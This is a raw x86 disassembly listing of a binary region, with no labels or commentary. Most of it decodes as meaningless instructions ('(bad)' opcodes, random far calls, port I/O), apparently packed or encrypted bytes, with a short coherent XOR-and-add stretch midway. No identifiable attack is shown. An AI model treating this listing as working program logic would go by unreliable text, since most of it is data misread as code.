  4118b7:	enter  0x5246,0x96
  4118bb:	pop    esi
  4118bc:	std    
  4118bd:	xor    ebx,eax
  4118bf:	repnz push ebp
  4118c1:	out    dx,eax
  4118c2:	jnp    0x411937
  4118c4:	cmp    DWORD PTR [ecx-0x1c92815c],esi
  4118ca:	cli    
  4118cb:	xor    edx,DWORD PTR [esp+esi*8]
  4118ce:	dec    ebx
  4118cf:	jnp    0x4118c6
  4118d1:	(bad)  
  4118d2:	in     eax,0x7f
  4118d4:	add    esp,DWORD PTR [ecx+ecx*1]
  4118d7:	pop    ecx
  4118d8:	fist   WORD PTR [edx+0x1f]
  4118db:	stc    
  4118dc:	pop    ds
  4118dd:	stos   DWORD PTR es:[edi],eax
  4118de:	cmp    esp,ecx
  4118e0:	(bad)  
  4118e1:	les    ebx,FWORD PTR [edi]
  4118e3:	in     eax,0xdd
  4118e5:	inc    eax
  4118e6:	dec    ecx
  4118e7:	cmp    edi,DWORD PTR [edi-0x1f556b7d]
  4118ed:	sub    BYTE PTR [eax-0x1cf90ffc],0x6f
  4118f4:	sbb    bh,bh
  4118f6:	call   0x2e179b9a
  4118fb:	scas   al,BYTE PTR es:[edi]
  4118fc:	out    dx,al
  4118fd:	retf   
  4118fe:	xor    BYTE PTR [ebx+esi*8-0xc1a04e3],dh
  411905:	dec    ecx
  411906:	adc    edi,DWORD PTR [esi]
  411908:	bound  ebx,QWORD PTR [edx-0x2e]
  41190b:	loopne 0x41191b
  41190d:	sar    BYTE PTR [esi+0x65544ab8],1
  411913:	cwde   
  411914:	mov    al,0x5b
  411916:	sub    edi,DWORD PTR [esi-0x42]
  411919:	loope  0x411905
  41191b:	ret    0x3f7a
  41191e:	mov    ecx,0xb7431934
  411923:	push   0xf9183af7
  411928:	jl     0x41196d
  41192a:	or     cl,BYTE PTR [esi+ebp*4]
  41192d:	sub    al,0x88
  41192f:	(bad)  
  411930:	xchg   edx,eax
  411931:	bound  esp,QWORD PTR [eax+eax*1+0x527dd697]
  411938:	add    ch,ah
  41193a:	(bad)  
  41193b:	or     DWORD PTR [eax+0x36],esp
  41193e:	xchg   ecx,eax
  41193f:	shr    BYTE PTR es:[edi-0x6d9df96a],cl
  411946:	or     BYTE PTR [esi],0x83
  411949:	fmul   st(0),st
  41194b:	push   eax
  41194c:	out    0x7b,al
  41194e:	mov    bh,0xab
  411950:	dec    edi
  411951:	call   0x3e5a:0xc50bf248
  411958:	mov    bh,0xb9
  41195a:	push   0x88d99163
  41195f:	sahf   
  411960:	iret   
  411961:	aaa    
  411962:	push   cs
  411963:	mov    al,0x2a
  411965:	fnstcw WORD PTR [edx-0x721afd9b]
  41196b:	into   
  41196c:	lods   eax,DWORD PTR ds:[esi]
  41196d:	(bad)  
  41196e:	jp     0x411958
  411970:	and    DWORD PTR [ebp-0x5c],eax
  411973:	aaa    
  411974:	push   edx
  411975:	pop    eax
  411976:	cmp    ebx,edx
  411978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411979:	inc    eax
  41197a:	addr16 pop ecx
  41197c:	pop    esp
  41197d:	mov    esi,0x1cc8de23
  411982:	xchg   edi,eax
  411983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411984:	jge    0x411934
  411986:	xor    edx,eax
  411988:	sub    dh,dh
  41198a:	sub    al,0xc7
  41198c:	aad    0x5
  41198e:	add    al,cl
  411990:	leave  
  411991:	mov    ds:0x12c685fe,al
  411996:	cmp    al,0x3d
  411998:	jns    0x411a0a
  41199a:	(bad)  
  41199b:	and    eax,0x654d971b
  4119a0:	jbe    0x411943
  4119a2:	cdq    
  4119a3:	out    0x7d,al
  4119a5:	aam    0xae
  4119a7:	test   BYTE PTR [esi],ah
  4119a9:	cmp    bh,BYTE PTR [ebp+0x5cac26e5]
  4119af:	mov    cl,0xa9
  4119b1:	push   eax
  4119b2:	adc    dh,BYTE PTR [esi-0x31]
  4119b5:	into   
  4119b6:	xchg   esp,eax
  4119b7:	and    edx,0x37
  4119ba:	xchg   BYTE PTR ds:0x73158131,bh
  4119c0:	mov    eax,0xc90bc95
  4119c5:	fadd   DWORD PTR [ebx+0x3d]
  4119c8:	and    ch,dh
  4119ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119cb:	jge    0x411992
  4119cd:	cli    
  4119ce:	dec    ebp
  4119cf:	cmp    al,0xac
  4119d1:	mov    bh,0xb9
  4119d3:	pop    eax
  4119d4:	xchg   al,cl
  4119d6:	cld    
  4119d7:	dec    eax
  4119d8:	cmp    edx,eax
  4119da:	xor    al,al
  4119dc:	lea    ebp,[edi]
  4119de:	ja     0x411a1d
  4119e0:	xchg   ch,bh
  4119e2:	fnstcw WORD PTR [edx-0x65a4f564]
  4119e8:	stos   BYTE PTR es:[edi],al
  4119e9:	push   0x9dedd0fc
  4119ee:	aaa    
  4119ef:	and    eax,DWORD PTR [esi]
  4119f1:	sbb    BYTE PTR [esi+ebx*2-0x2d9f568e],bl
  4119f8:	dec    ebx
  4119f9:	pop    esi
  4119fa:	cmp    bh,cl
  4119fc:	sahf   
  4119fd:	idiv   BYTE PTR [ecx-0x32]
  411a00:	jo     0x4119a3
  411a02:	and    ecx,DWORD PTR [edi-0x376acfb0]
  411a08:	or     al,0x42
  411a0a:	mov    cl,0xa3
  411a0c:	sub    al,0x6e
  411a0e:	or     esp,DWORD PTR [edi]
  411a10:	inc    ebx
  411a11:	std    
  411a12:	(bad)  
  411a14:	jp     0x4119d7
  411a16:	std    
  411a17:	clc    
  411a18:	maskmovq mm1,(bad)
  411a19:	test   DWORD PTR [eax+0x73],0x252621b5
  411a20:	add    eax,0xa9515670
  411a25:	jns    0x411a30
  411a27:	prefetch (bad)
  411a28:	or     eax,0xb151ef5
  411a2d:	add    eax,0x3f51a855
  411a32:	dec    ebx
  411a33:	xchg   edx,eax
  411a34:	pop    eax
  411a35:	dec    esi
  411a36:	mov    dh,0x1d
  411a39:	out    dx,eax
  411a3a:	data16 jbe 0x411a05
  411a3d:	xchg   esi,eax
  411a3e:	outs   dx,BYTE PTR ds:[esi]
  411a3f:	xchg   ebp,eax
  411a40:	cld    
  411a41:	cmp    al,0x50
  411a43:	and    al,0x8
  411a45:	call   0xc2e68f95
  411a4a:	or     eax,0x7f87aeca
  411a4f:	call   0x3165e30f
  411a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a55:	push   cs
  411a56:	fwait
  411a57:	addr16 mov edx,0x33fba84
  411a5d:	(bad)  
  411a5e:	fst    QWORD PTR [edi+ecx*4+0x7d]
  411a62:	xlat   BYTE PTR ds:[ebx]
  411a63:	adc    BYTE PTR [ebx],bl
  411a65:	xchg   ebx,eax
  411a66:	mov    bh,0x75
  411a68:	gs (bad) 
  411a6a:	mov    bl,0x23
  411a6c:	ja     0x411a80
  411a6e:	sub    bh,dh
  411a70:	icebp  
  411a71:	sbb    DWORD PTR [ebx-0x67],ecx
  411a74:	xor    BYTE PTR [edx-0x6c],cl
  411a77:	stos   BYTE PTR es:[edi],al
  411a78:	push   edi
  411a79:	imul   edi,DWORD PTR [edi],0x16
  411a7c:	fimul  DWORD PTR [eax]
  411a7e:	loope  0x411ac0
  411a80:	ja     0x411a91
  411a82:	push   ss
  411a83:	push   esp
  411a84:	out    dx,al
  411a85:	leave  
  411a86:	jbe    0x411a10
  411a88:	pop    es
  411a89:	call   0x9ac8ec9
  411a8e:	xchg   ebp,eax
  411a8f:	cmp    al,0x10
  411a91:	rcl    DWORD PTR ds:0xe341fc75,1
  411a97:	or     DWORD PTR [edx-0x5e7ea136],0x8cb8932c
  411aa1:	mov    esi,0xee44f852
  411aa6:	out    dx,eax
  411aa7:	ins    BYTE PTR es:[edi],dx
  411aa8:	loop   0x411a8d
  411aaa:	scas   eax,DWORD PTR es:[edi]
  411aab:	test   BYTE PTR [eax+0x34],cl
  411aae:	cmp    dh,BYTE PTR ss:[ebp+0x66]
  411ab2:	std    
  411ab3:	mul    DWORD PTR [edi-0xb]
  411ab6:	addr16 fs pop esp
  411ab9:	jae    0x411abb
  411abb:	pop    edi
  411abc:	sub    bh,al
  411abe:	imul   ecx,DWORD PTR [edi-0x5b1be55b],0x8564d6bc
  411ac8:	add    al,0xb9
  411aca:	cmp    cl,BYTE PTR [ecx+0x55]
  411acd:	xor    eax,DWORD PTR [ebp-0x3540b1b3]
  411ad3:	arpl   WORD PTR [eax-0x27],ax
  411ad6:	sbb    DWORD PTR fs:[ebp+0x5770ad4],ebp
  411add:	push   esp
  411ade:	sbb    dl,dl
  411ae0:	and    eax,0xfdf0473d
  411ae5:	cli    
  411ae6:	shr    BYTE PTR [edx+0x75],cl
  411ae9:	add    bh,BYTE PTR [ecx+0x688388c6]
  411aef:	jmp    0x411adf
  411af1:	sbb    ebp,edi
  411af3:	pop    ds
  411af4:	pop    edx
  411af5:	and    al,0xcf
  411af7:	stos   BYTE PTR es:[edi],al
  411af8:	and    ecx,DWORD PTR [eax-0x69]
  411afb:	dec    esp
  411afc:	add    eax,0xf45f416d
  411b01:	ss mov ebx,0x7b94c430
  411b07:	psubusb mm6,QWORD PTR [esp+ebp*1-0x7d]
  411b0c:	rcr    BYTE PTR [edx],0xd4
  411b0f:	jno    0x411af8
  411b11:	mov    edi,0xa44ff32e
  411b16:	xor    al,0x67
  411b18:	(bad)  
  411b1a:	adc    al,0x1e
  411b1c:	jo     0x411b6c
  411b1e:	retf   0x75a8
  411b21:	or     al,0x6
  411b23:	mov    ecx,0xd0d8872c
  411b28:	into   
  411b29:	cmp    esp,ecx
  411b2b:	ficom  WORD PTR [ebx-0x510f23a]
  411b31:	call   0xa1d642e5
  411b36:	add    eax,0x30af07f8
  411b3b:	mov    esi,ebx
  411b3d:	push   edx
  411b3e:	clc    
  411b3f:	push   DWORD PTR [edx-0x1e]
  411b42:	cmp    eax,0x2ec6a72b
  411b47:	leave  
  411b48:	sub    DWORD PTR [ecx-0x43],ebx
  411b4b:	sub    ah,BYTE PTR [ebx+eiz*8+0x5f]
  411b4f:	pushf  
  411b50:	lock jno 0x411b97
  411b53:	mov    edi,0xda04c6c4
  411b58:	push   cs
  411b59:	jge    0x411af0
  411b5b:	imul   BYTE PTR [eax+edi*8-0x1db9f91a]
  411b62:	lea    eax,[esi+0x3a1bfcb2]
  411b68:	inc    esi
  411b69:	cmp    BYTE PTR [ecx+0x7c778317],0x9b
  411b70:	test   BYTE PTR [eax+0x7e805c7],ch
  411b76:	pop    esi
  411b77:	outs   dx,DWORD PTR ds:[esi]
  411b78:	stos   BYTE PTR es:[edi],al
  411b79:	push   ecx
  411b7a:	pop    ebx
  411b7b:	jnp    0x411b4f
  411b7d:	jg     0x411b0c
  411b7f:	jp     0x411b41
  411b81:	push   eax
  411b82:	gs mov bl,0xe6
  411b85:	push   esi
  411b86:	out    dx,eax
  411b87:	ins    BYTE PTR es:[edi],dx
  411b88:	jae    0x411b84
  411b8a:	iret   
  411b8b:	push   eax
  411b8c:	icebp  
  411b8d:	repz adc ebx,esi
  411b90:	cmp    al,0xf0
  411b92:	mov    DWORD PTR [edi-0x4b],ebp
  411b95:	dec    ebx
  411b96:	jl     0x411b5f
  411b98:	or     cl,BYTE PTR [esi+0x46]
  411b9b:	and    esp,ebx
  411b9d:	dec    eax
  411b9e:	retf   
  411b9f:	add    bl,BYTE PTR [esi+0x4d]
  411ba2:	ret    
  411ba3:	xor    BYTE PTR [edx],bl
  411ba5:	add    ecx,ebp
  411ba7:	in     eax,0xa9
  411ba9:	xor    BYTE PTR [eax+0x3a],ch
  411bac:	leave  
  411bad:	mov    dl,0x36
  411baf:	push   ecx
  411bb0:	in     al,dx
  411bb1:	sub    al,0xea
  411bb3:	ins    BYTE PTR es:[edi],dx
  411bb4:	mov    eax,0x8b0ebc42
  411bb9:	retf   0xd47
  411bbc:	fsubr  QWORD PTR ds:0x59f9752b
  411bc2:	iret   
  411bc3:	xor    BYTE PTR [ebp-0x18],dl
  411bc6:	sahf   
  411bc7:	stos   DWORD PTR es:[edi],eax
  411bc8:	ja     0x411b9c
  411bca:	test   DWORD PTR [eax],eax
  411bcc:	inc    edx
  411bcd:	std    
  411bce:	pop    ecx
  411bcf:	aam    0x43
  411bd1:	out    dx,al
  411bd2:	div    DWORD PTR [edx+0x34efc13e]
  411bd8:	rol    dl,0x96
  411bdb:	xchg   ebp,eax
  411bdc:	jl     0x411c3c
  411bde:	in     al,dx
  411bdf:	xchg   esi,eax
  411be0:	nop
  411be1:	ror    esp,0x1e
  411be4:	sbb    DWORD PTR [ebx],0x78
  411be7:	arpl   WORD PTR [edi],di
  411be9:	mov    ebp,0x81241bbc
  411bee:	leave  
  411bef:	dec    ebp
  411bf0:	jnp    0x411c3a
  411bf2:	mov    eax,ds:0xf274e5e4
  411bf7:	ins    BYTE PTR es:[edi],dx
  411bf8:	rcr    DWORD PTR [edx-0x4c0aaafb],0x51
  411bff:	jns    0x411c0d
  411c01:	rcr    ecx,cl
  411c03:	or     BYTE PTR [ebp-0x4ec765d9],dl
  411c09:	fwait
  411c0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c0b:	(bad)  
  411c0d:	xor    eax,0xa1395005
  411c12:	pushf  
  411c13:	pop    es
  411c14:	retf   0xadf9
  411c17:	xchg   ebp,eax
  411c18:	sub    BYTE PTR [edx],al
  411c1a:	dec    esi
  411c1b:	pop    ebx
  411c1c:	addr16 pop edx
  411c1e:	fwait
  411c1f:	sbb    al,0x82
  411c21:	fs retf 
  411c23:	in     eax,0xbb
  411c25:	outs   dx,BYTE PTR ds:[esi]
  411c26:	in     al,0x67
  411c28:	mov    tr2,esp
  411c2b:	xchg   ebp,eax
  411c2c:	xchg   BYTE PTR [eax+0x1b25633e],ch
  411c32:	ficom  DWORD PTR [eax+0x3b812d1f]
  411c38:	hlt    
  411c39:	ins    DWORD PTR es:[edi],dx
  411c3a:	call   FWORD PTR [eax+0x5a]
  411c3d:	call   0xbe6e:0xca838f0d
  411c44:	(bad)  
  411c45:	push   ds
  411c46:	cli    
  411c47:	scas   eax,DWORD PTR es:[edi]
  411c48:	sar    esp,1
  411c4a:	or     BYTE PTR [edi+eiz*1+0x19],al
  411c4e:	xor    BYTE PTR [edi+0x7c],bl
  411c51:	sahf   
  411c52:	and    BYTE PTR [eax+0x2a410615],dh
  411c58:	cmp    eax,0x83bd4d14
  411c5d:	les    ebx,FWORD PTR [edx]
  411c5f:	jnp    0x411c0c
  411c61:	mov    BYTE PTR [edx-0x3c805722],al
  411c67:	outs   dx,DWORD PTR ds:[esi]
  411c68:	call   FWORD PTR [esi+edx*8-0x29]
  411c6c:	retf   0x2ca1
  411c6f:	mov    dl,0x41
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xa6264a5e
  411cb8:	nop
  411cb9:	pop    esi
  411cba:	push   ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411c59
  411cc2:	inc    edx
  411cc3:	xor    BYTE PTR [ecx-0x51],0xe7
  411cc7:	mov    al,BYTE PTR ds:0x552c0419
  411ccd:	dec    esi
  411cce:	js     0x411c80
  411cd0:	push   esp
  411cd1:	jg     0x411c97
  411cd3:	enter  0x71d6,0x6e
  411cd7:	dec    ecx
  411cd8:	sbb    bl,BYTE PTR [edi-0x6f23dcb3]
  411cde:	ss sbb al,0xf7
  411ce1:	sub    DWORD PTR [eax+esi*2],edi
  411ce4:	push   0xffffffd6
  411ce6:	push   ss
  411ce7:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  411ce9:	outs   dx,BYTE PTR ds:[esi]
  411cea:	fs cmp eax,esi
  411ced:	(bad)  
  411cee:	mov    al,0x2
  411cf0:	rol    BYTE PTR [edx+0x5af59d2d],1
  411cf6:	xor    al,BYTE PTR [esp+ebp*8-0x3226359a]
  411cfd:	pop    eax
  411cfe:	test   al,0xef
  411d00:	xlat   BYTE PTR ds:[ebx]
  411d01:	sub    BYTE PTR [ebx+0x49e5b9fd],dh
  411d07:	jmp    0x7d4240eb
  411d0c:	ja     0x411cee
  411d0e:	stos   DWORD PTR es:[edi],eax
  411d0f:	fisttp DWORD PTR [edi-0x78]
  411d12:	add    esi,DWORD PTR [eax-0x65]
  411d15:	fcmove st,st(2)
  411d17:	retf   0x191d
  411d1a:	mov    ebx,0x930e3970
  411d1f:	test   DWORD PTR [esi],edi
  411d21:	lds    eax,FWORD PTR [eax-0x5f]
  411d24:	in     al,0x2d
  411d26:	pop    ds
  411d27:	pavgb  mm6,QWORD PTR [edx]
  411d2a:	push   0x651913be
  411d2f:	push   esi
  411d30:	xor    DWORD PTR ds:0xbc2f3cc4,edi
  411d36:	mov    edx,0xd7fe0129
  411d3b:	scas   eax,DWORD PTR es:[edi]
  411d3c:	std    
  411d3d:	rol    cl,cl
  411d3f:	cmp    BYTE PTR [edx+0x7663e581],al
  411d45:	out    0x47,al
  411d47:	popf   
  411d48:	push   ecx
  411d49:	ret    
  411d4a:	jmp    0x552d:0xa46f7d63
  411d51:	adc    dh,BYTE PTR [ebx]
  411d53:	inc    eax
  411d54:	js     0x411cd9
  411d56:	pop    esi
  411d57:	xchg   edx,eax
  411d58:	pop    eax
  411d59:	nop
  411d5a:	and    eax,DWORD PTR ds:0xea18d08
  411d60:	in     eax,dx
  411d61:	loope  0x411cff
  411d63:	in     al,dx
  411d64:	sbb    al,0xc2
  411d66:	leave  
  411d67:	dec    ecx
  411d68:	shr    BYTE PTR fs:[eax],0xbf
  411d6c:	mov    ebp,0x378921eb
  411d71:	fidiv  WORD PTR [esi-0x22]
  411d74:	popf   
  411d75:	repz pop es
  411d77:	push   esp
  411d78:	mov    ebp,0xd9615359
  411d7d:	rol    BYTE PTR ds:0x265c7f44,cl
  411d83:	leave  
  411d84:	pop    ebx
  411d85:	push   esi
  411d86:	outs   dx,WORD PTR ds:[esi]
  411d88:	dec    DWORD PTR [edi+0x2e]
  411d8b:	std    
  411d8c:	mov    ebx,DWORD PTR [edi]
  411d8e:	shl    ebx,cl
  411d90:	dec    edi
  411d91:	retf   
  411d92:	cmp    BYTE PTR [ecx+0x7d],bl
  411d95:	enter  0x75fb,0x38
  411d99:	xchg   DWORD PTR [esi+0x648d6795],esi
  411d9f:	pop    ds
  411da0:	pop    es
  411da1:	push   ebp
  411da2:	(bad)  
  411da3:	lds    edi,FWORD PTR [eax+0x50b664cb]
  411da9:	inc    esp
  411daa:	pop    ebp
  411dab:	test   DWORD PTR [edi],edx
  411dad:	adc    ecx,DWORD PTR [eax-0x54]
  411db0:	mov    edx,0x4113e237
  411db5:	inc    eax
  411db6:	and    bh,cl
  411db8:	cmp    DWORD PTR [ecx],0xffffff99
  411dbb:	pop    ecx
  411dbc:	aaa    
  411dbd:	mov    bl,0xa
  411dbf:	pop    esp
  411dc0:	int    0xe0
  411dc2:	aas    
  411dc3:	sbb    bh,BYTE PTR [ecx+0x33aa58f7]
  411dc9:	dec    ecx
  411dca:	imul   eax,DWORD PTR [ebx],0x6a
  411dcd:	mov    edi,0x569d55cd
  411dd2:	int    0x95
  411dd4:	mov    eax,ds:0x27aafd1f
  411dd9:	push   0xffffffdb
  411ddb:	pop    edx
  411ddc:	or     ecx,esi
  411dde:	mov    ecx,0x5cfe24c5
  411de3:	retf   
  411de4:	loopne 0x411e57
  411de6:	jnp    0x411e06
  411de8:	loopne 0x411e3f
  411dea:	mov    dh,0x36
  411dec:	int3   
  411ded:	and    DWORD PTR [ecx+0x61],0xffffff9f
  411df1:	imul   ecx,DWORD PTR [ebx+0x6],0x362deb37
  411df8:	mov    DWORD PTR [ebx],eax
  411dfa:	ret    0x9066
  411dfd:	mov    dh,0x68
  411dff:	mov    ds:0x1af7ac67,al
  411e04:	imul   eax,DWORD PTR ds:[eax],0xccf753b2
  411e0b:	adc    BYTE PTR [edx],dh
  411e0d:	xchg   edi,eax
  411e0e:	sbb    bh,BYTE PTR ds:0x529a1a76
  411e14:	sub    ecx,DWORD PTR [ebx-0x65c85576]
  411e1a:	sub    eax,0x92835df8
  411e1f:	fcmovne st,st(3)
  411e21:	dec    edx
  411e22:	enter  0xd520,0x4f
  411e26:	xor    BYTE PTR [ebp+0x10],ch
  411e29:	adc    eax,0x9be4e495
  411e2e:	sbb    BYTE PTR [edi+0x40f6ceb7],ch
  411e34:	ret    
  411e35:	mov    DWORD PTR [ebx],edi
  411e37:	sub    BYTE PTR [esi-0x51bacfd7],ch
  411e3d:	je     0x411e3c
  411e3f:	stos   DWORD PTR es:[edi],eax
  411e40:	dec    esi
  411e41:	and    al,0x37
  411e43:	shr    DWORD PTR [ebx],0x52
  411e46:	push   ebx
  411e47:	out    0x98,eax
  411e49:	pop    esi
  411e4a:	mov    ebp,DWORD PTR [ebx+ebx*1]
  411e4d:	out    dx,al
  411e4e:	fcmovnb st,st(1)
  411e50:	sbb    ah,BYTE PTR [eax]
  411e52:	test   eax,0x49656fac
  411e57:	mov    WORD PTR [edi+0x5f],ss
  411e5a:	stos   DWORD PTR es:[edi],eax
  411e5b:	xchg   esi,eax
  411e5c:	icebp  
  411e5d:	push   cs
  411e5e:	pop    ecx
  411e5f:	xor    al,BYTE PTR [eax+0x6c]
  411e62:	push   cs
  411e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e64:	mov    al,ds:0x7fc0b0cc
  411e69:	xchg   edx,eax
  411e6a:	popa   
  411e6b:	ret    0xd461
  411e6e:	retf   
  411e6f:	repnz fbld TBYTE PTR [ebx-0x7c]
  411e73:	out    0x36,al
  411e75:	enter  0x885b,0xa1
  411e79:	repz inc esp
  411e7b:	aas    
  411e7c:	mov    ds:0xb227b068,al
  411e81:	xor    eax,0x32a12a50
  411e86:	pop    ss
  411e87:	dec    ebx
  411e88:	call   0x2234a1e5
  411e8d:	imul   esp,DWORD PTR [esi-0xf],0x5a8da14e
  411e94:	(bad)  [esp+esi*4-0x64]
  411e98:	clc    
  411e99:	in     al,dx
  411e9a:	aam    0xff
  411e9c:	adc    al,BYTE PTR [ecx-0x69]
  411e9f:	pop    edx
  411ea0:	inc    ebx
  411ea1:	add    ebp,eax
  411ea3:	cli    
  411ea4:	lds    esi,FWORD PTR [eax+0x48beb6be]
  411eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eab:	add    edx,DWORD PTR [edx+0x70]
  411eae:	icebp  
  411eaf:	retf   0x81a3
  411eb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eb3:	sub    ebx,edi
  411eb5:	rcl    dh,1
  411eb7:	mov    edx,esi
  411eb9:	mov    esi,0xf8f692d2
  411ebe:	fistp  QWORD PTR [edi+0x3e2d7759]
  411ec4:	push   eax
  411ec5:	mov    ebx,0x140482eb
  411eca:	aad    0x91
  411ecc:	inc    eax
  411ecd:	out    0xfa,eax
  411ecf:	mov    edx,?
  411ed1:	ss dec esp
  411ed3:	pop    eax
  411ed4:	or     eax,0x9d592b0e
  411ed9:	fs or  eax,0xce5dd06a
  411edf:	aad    0xf1
  411ee1:	in     eax,0xd1
  411ee3:	retf   
  411ee4:	cli    
  411ee5:	pop    es
  411ee6:	adc    al,0xbe
  411ee8:	shr    BYTE PTR [edi],0x94
  411eeb:	push   0x47
  411eed:	sbb    eax,0xa78aa62e
  411ef2:	repz or eax,0x7360b4ec
  411ef8:	std    
  411ef9:	fild   DWORD PTR [ebp+0x3b]
  411efc:	mov    ah,0xd9
  411efe:	shl    DWORD PTR [edi],cl
  411f00:	push   eax
  411f01:	fwait
  411f02:	adc    DWORD PTR ds:0xfe94978b,esi
  411f08:	mov    al,ds:0xe394fd5a
  411f0d:	xchg   edi,eax
  411f0e:	fcomp  st(0)
  411f10:	push   ebp
  411f11:	adc    al,0x20
  411f13:	call   0xe9c:0xdbc3fb77
  411f1a:	inc    edi
  411f1b:	sbb    BYTE PTR [esi+0xa73c5d7],bh
  411f21:	jne    0x411f85
  411f23:	in     al,0x82
  411f25:	mov    edi,0xa09d0bbd
  411f2a:	add    bl,BYTE PTR [edi+0x6dae2858]
  411f30:	pop    ds
  411f31:	enter  0xa44,0x52
  411f35:	sub    al,dl
  411f37:	cmp    eax,0xd5699747
  411f3c:	push   ss
  411f3d:	jb     0x411eed
  411f3f:	sub    dh,cl
  411f41:	in     eax,dx
  411f42:	jmp    0x54df7f41
  411f47:	inc    edi
  411f48:	jg     0x411fc9
  411f4a:	mov    ebx,gs
  411f4c:	pushf  
  411f4d:	fisttp QWORD PTR [edx-0x44]
  411f50:	pusha  
  411f51:	jl     0x411f54
  411f53:	fcom   DWORD PTR [eax-0x368d24bd]
  411f59:	and    DWORD PTR [esi-0x7c],eax
  411f5c:	call   0xb822:0xc2064e96
  411f63:	add    edi,edi
  411f65:	sub    BYTE PTR [esi+eiz*8],0xa1
  411f69:	or     DWORD PTR [esi],ebx
  411f6b:	out    dx,al
  411f6c:	stc    
  411f6d:	in     eax,0x43
  411f6f:	in     eax,0x4
  411f71:	in     al,dx
  411f72:	inc    esi
  411f73:	arpl   si,cx
  411f75:	scas   al,BYTE PTR es:[edi]
  411f76:	pop    esp
  411f77:	fild   WORD PTR [esi-0x3d28480]
  411f7d:	cs push ds
  411f7f:	jb     0x411ffe
  411f81:	sti    
  411f82:	cli    
  411f83:	sbb    ebx,esi
  411f85:	jae    0x411f6b
  411f87:	shl    DWORD PTR [eax+0x5a1433bf],1
  411f8d:	or     ch,BYTE PTR [eax-0x4a]
  411f90:	stos   BYTE PTR es:[edi],al
  411f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f92:	inc    edi
  411f93:	xor    bl,BYTE PTR [esi-0x37972d29]
  411f99:	pop    edi
  411f9a:	cmp    ebp,edi
  411f9c:	mov    dl,BYTE PTR [eax-0x72]
  411f9f:	and    eax,0x927e75d7
  411fa4:	cmp    DWORD PTR [eax],0xffffff93
  411fa7:	push   edi
  411fa8:	sahf   
  411fa9:	retf   
  411faa:	pop    ax
  411fac:	test   DWORD PTR [esi-0xe],0xfe33f559
  411fb3:	sub    bh,ah
  411fb5:	pop    esp
  411fb6:	and    eax,0xd956c799
  411fbb:	jg     0x411fc8
  411fbd:	mov    ecx,0x964a371b
  411fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fc3:	stos   BYTE PTR es:[edi],al
  411fc4:	or     bl,ch
  411fc6:	rcl    edi,cl
  411fc8:	or     bl,BYTE PTR [ebx]
  411fca:	jmp    0x41203e
  411fcc:	xchg   DWORD PTR [ecx+0x638b2011],edx
  411fd2:	cld    
  411fd3:	mov    al,0xbf
  411fd5:	dec    esp
  411fd6:	out    0x36,eax
  411fd8:	cmp    BYTE PTR [edi],0x59
  411fdb:	popa   
  411fdc:	pop    esp
  411fdd:	adc    al,BYTE PTR [edi]
  411fdf:	inc    ebx
  411fe0:	and    edi,DWORD PTR [ebx]
  411fe2:	mov    ah,0x49
  411fe4:	or     DWORD PTR [esi],edx
  411fe6:	adc    eax,0xe0b6035c
  411feb:	lods   eax,DWORD PTR ds:[esi]
  411fec:	faddp  st(5),st
  411fee:	js     0x411fc2
  411ff0:	jl     0x411f93
  411ff2:	mov    esi,DWORD PTR ds:0xb9cda72a
  411ff8:	jo     0x411fb6
  411ffa:	(bad)
  411ffd:	jmp    0x5d9a008e
  412002:	xor    eax,0xa474c901
  412007:	nop
  412008:	lods   al,BYTE PTR ds:[esi]
  412009:	in     al,0x90
  41200b:	push   cs
  41200c:	lods   eax,DWORD PTR ds:[esi]
  41200d:	push   es
  41200e:	out    0x16,al
  412010:	out    dx,eax
  412011:	xor    BYTE PTR [ecx-0x13d96498],0x27
  412018:	outs   dx,DWORD PTR ds:[esi]
  412019:	adc    DWORD PTR [eax-0x2b54cbed],eax
  41201f:	mov    al,0x26
  412021:	pop    esp
  412022:	and    ecx,DWORD PTR [edi-0x651f1699]
  412028:	sbb    ah,BYTE PTR [eax-0x1f948048]
  41202e:	xrelease mov BYTE PTR [ebx+0x7e],bh
  412032:	cmp    DWORD PTR [ecx],edx
  412034:	add    al,0xad
  412036:	iret   
  412037:	test   BYTE PTR [ecx-0x7a],dh
  41203a:	add    dl,BYTE PTR [esi-0x23e2cff2]
  412040:	cmc    
  412041:	adc    al,0x61
  412043:	push   esi
  412044:	adc    BYTE PTR [ebp-0x2d],bh
  412047:	rcl    DWORD PTR [ebp+edi*8+0x29],cl
  41204b:	inc    ebp
  41204c:	mov    eax,0xeb3a9fcc
  412051:	adc    eax,0xa5665abe
  412056:	pop    ecx
  412057:	inc    esp
  412058:	mov    ebx,0xb1bbb8d4
  41205d:	mov    cl,0xe5
  41205f:	xchg   ebx,eax
  412060:	dec    eax
  412061:	xchg   esp,eax
  412062:	icebp  
  412063:	in     al,dx
  412064:	xlat   BYTE PTR ds:[ebx]
  412065:	ss daa 
  412067:	outs   dx,DWORD PTR ds:[esi]
  412068:	pop    DWORD PTR [edx]
  41206a:	pop    ss
  41206b:	ret    
  41206c:	cwde   
